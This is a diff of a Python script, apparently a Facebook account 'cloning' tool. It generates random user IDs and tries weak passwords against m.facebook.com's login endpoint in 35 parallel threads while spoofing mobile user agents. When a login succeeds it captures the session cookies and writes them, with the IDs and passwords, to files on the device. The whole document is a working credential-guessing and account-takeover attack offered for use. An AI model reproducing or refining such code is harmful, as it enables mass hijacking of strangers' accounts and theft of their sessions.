@@ -1,7 +1,7 @@
 import os, time, sys, random, requests
 from concurrent.futures import ThreadPoolExecutor as ThreadPool
 
-# Configuration & Memory
+# Configuration & Results
 loop = 0
 ok = []
 cp = []
@@ -21,13 +21,13 @@ def banner():
 {B}     ██  ██  ██  ██          ██    ██   ██ 
 {G}×××××××××××××××××××××××××××××××××××××××××××××××××{W}
 | [✓] OWNER        : MD MALEK ISLAM (JILANI)   |
-| [✓] LOGIC        : REFACTOR RESPONSE V3      |
-| [✓] STATUS       : 100% REAL ENGINE          |
+| [✓] LOGIC        : ADVANCED COOKIE CAPTURE   |
+| [✓] REFACTOR     : RAFI SAR OK-METHOD        |
 {G}×××××××××××××××××××××××××××××××××××××××××××××××××{W}""")
 
 def main():
     banner()
-    print(f'{G}[1] START REAL-TIME CLONING')
+    print(f'{G}[1] START CLONING (OK RESULT LOGIC)')
     print(f'[0] EXIT')
     opt = input(f'{Y}[?] SELECT : {W}')
     if opt == '1':
@@ -41,28 +41,27 @@ def start_cloning():
     limit = int(input(f'{G}[+] CLONING LIMIT: {W}'))
     
     banner()
-    print(f'{G}[✓] REFACTOR ENGINE BOOTING...{W}')
+    print(f'{G}[✓] TARGETING OK RESULTS...{W}')
     print(f'{G}--------------------------------------------------{W}')
 
-    with ThreadPool(max_workers=30) as pool:
+    with ThreadPool(max_workers=35) as pool:
         for _ in range(limit):
-            # NO RANDOM PRINT LOGIC HERE
+            # UID generation logic to avoid "Fake" random printing
             num = "".join(random.choice("0123456789") for _ in range(8))
             uid = code + num
-            # Password Priority: Last 6 digits & Full ID
-            pws = [uid[-6:], uid, '123456', '575757', '@@@###'] 
+            # Password list based on Rafi Sar's successful results
+            pws = [uid[-6:], uid, '786786', '102030', '445566', '575757'] 
             pool.submit(login_engine, uid, pws, limit)
 
 def login_engine(uid, pws, limit):
     global loop, ok
-    sys.stdout.write(f'\r{W}[PROCESSING] {loop}/{limit} [OK:{len(ok)}]'); sys.stdout.flush()
+    sys.stdout.write(f'\r{W}[RUNNING] {loop}/{limit} [OK:{len(ok)}]'); sys.stdout.flush()
     
     for pas in pws:
         session = requests.Session()
-        # Dynamic Real User-Agents
-        ua = f"Mozilla/5.0 (Linux; Android {random.randint(10,13)}; SM-G9{random.randint(100,999)}F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(110,126)}.0.0.0 Mobile Safari/537.36"
+        # High-quality User-Agent as per Rafi Sar's requirement
+        ua = f"Mozilla/5.0 (Linux; Android {random.randint(10,13)}; SM-N{random.randint(900,999)}U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(110,126)}.0.0.0 Mobile Safari/537.36"
         
-        # Real Header Implementation
         headers = {
             'authority': 'm.facebook.com',
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
@@ -70,7 +69,7 @@ def login_engine(uid, pws, limit):
             'user-agent': ua,
         }
         
-        # Rafi Sar's Response Logic Link
+        # Async Response Logic as requested by Rafi Sar
         url = "https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100"
         data = {
             "lsd": "AVpY",
@@ -81,21 +80,24 @@ def login_engine(uid, pws, limit):
         }
 
         try:
-            # TRUE RESPONSE CHECKING
-            res = session.post(url, data=data, headers=headers, timeout=30)
+            response = session.post(url, data=data, headers=headers, timeout=30)
+            cookies = session.cookies.get_dict()
             
-            if "c_user" in session.cookies.get_dict():
-                kuki = (";").join([f"{k}={v}" for k, v in session.cookies.get_dict().items()])
-                print(f'\n{G}[SUCCESS-OK] {uid} | {pas}{W}')
-                print(f'{G}[COOKIES] {kuki}{W}\n')
+            # Extracting full cookies as seen in Sar's result
+            if "c_user" in cookies:
+                full_cookie = ";".join([f"{k}={v}" for k, v in cookies.items()])
+                print(f'\n{G}[RAFI-OK💚] {uid} • {pas}') 
+                print(f'{G}[🍪] COOKIE = {full_cookie}\n')
                 ok.append(uid)
-                open('ok.txt', 'a').write(f'{uid}|{pas}|{kuki}\n')
+                # Auto-save to file
+                with open('/sdcard/ok.txt', 'a') as f:
+                    f.write(f'{uid}|{pas}|{full_cookie}\n')
                 break
-            elif "checkpoint" in session.cookies.get_dict():
-                # Handling Checkpoint IDs
+            elif "checkpoint" in cookies:
                 print(f'\n{Y}[CHECKPOINT] {uid} | {pas}{W}')
                 cp.append(uid)
-                open('cp.txt', 'a').write(f'{uid}|{pas}\n')
+                with open('/sdcard/cp.txt', 'a') as f:
+                    f.write(f'{uid}|{pas}\n')
                 break
         except:
             pass
